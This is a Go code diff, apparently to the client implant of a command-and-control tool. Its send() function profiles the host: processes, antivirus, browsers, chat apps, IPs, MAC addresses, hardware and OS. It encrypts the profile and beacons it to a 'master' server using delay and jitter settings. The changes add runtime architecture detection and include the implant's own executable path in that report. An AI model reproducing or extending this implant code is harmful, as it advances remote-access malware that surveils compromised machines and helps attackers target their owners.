@@ -307,6 +307,9 @@ func getProcess_list() []string {
 	}
 	return names
 }
+func GetArch() string {
+	return runtime.GOARCH
+}
 func send() { //发送头部信息
     Process_win := getProcess_list()
     lowerSet := make(map[string]bool)
@@ -320,7 +323,7 @@ func send() { //发送头部信息
     ChatApps := matchChatApps(lowerSet)
     vmStat, _ := mem.VirtualMemory()
     systemType := getWindowsVersion()
-    Arm := "x64"
+    Arm := GetArch()
     usedGB := strconv.FormatFloat(float64(vmStat.Used)/(1024*1024*1024), 'f', 1, 64)
     totalGB := strconv.FormatFloat(float64(vmStat.Total)/(1024*1024*1024), 'f', 1, 64)
     percent := strconv.FormatFloat(vmStat.UsedPercent, 'f', 0, 64)
@@ -330,6 +333,7 @@ func send() { //发送头部信息
     currentDir, _:= os.Getwd()
     currentDir = strings.ReplaceAll(currentDir, "\\", "/")
     parts := strings.Split(master, ":")
+	executable, _ := os.Executable()
     add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable +"*//*"+ macs +"*//*"+ cpuInfo +"*//*"+ Antivirus +"*//*"+ Browsers +"*//*"+ ChatApps +"*//*"+ memoryStr +"*//*"+ systemType +"*//*"+ Arm
     encry_str := get_encry_s(&add_str)
     data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
@@ -343,6 +347,7 @@ func send() { //发送头部信息
             currentDir, _:= os.Getwd()
             currentDir = strings.ReplaceAll(currentDir, "\\", "/")
             parts := strings.Split(master, ":")
+			executable, _ := os.Executable()
             add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable
             encry_str := get_encry_s(&add_str)
             data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
@@ -459,7 +464,6 @@ func send() { //发送头部信息
         uid string
         version string
         clientname string
-        executable string
         delay int = 30
         delayMutex sync.RWMutex
         waitTime int = 3
@@ -1170,7 +1174,6 @@ func send() { //发送头部信息
     func run() {
         if onece {
             rand.Seed(time.Now().UnixNano())
-            executable, _ = os.Executable()
             decodeMap = buildDecodeMap()
             if uid == "" {uid = generateUUID()}
             initHttpClient()
